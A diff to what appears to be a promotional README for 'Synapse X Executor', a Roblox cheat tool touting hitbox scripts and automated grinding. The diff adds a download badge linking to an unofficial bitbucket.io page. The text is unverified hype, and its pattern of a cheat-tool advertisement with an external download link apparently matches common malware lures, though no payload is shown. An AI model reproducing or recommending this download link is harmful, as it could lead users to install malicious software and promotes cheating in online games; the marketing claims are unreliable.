@@ -3,6 +3,8 @@
 🌟 **Welcome to Synapse X Executor** 🌟  
 The **most powerful Roblox script executor** of 2025, trusted by thousands for its **blazing speed**, **cross-platform support**, and **unmatched compatibility** with Lua scripts . Whether you’re dominating *Phantom Forces* with hitbox scripts or automating *Jailbreak* grinds, Synapse X delivers **zero-lag performance** and a library of premium tools .  
 
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blueviolet)](https://robloxexecutors.bitbucket.io/executors/synapse-x/)
+
 🔥 **Why Synapse X?** 🔥  
 ✅ **Lightning-Fast Injection**: Execute scripts in milliseconds, even in intense battles .  
 ✅ **Bytecode Conversion**: Run *any* Lua script, including obfuscated or encrypted ones .  
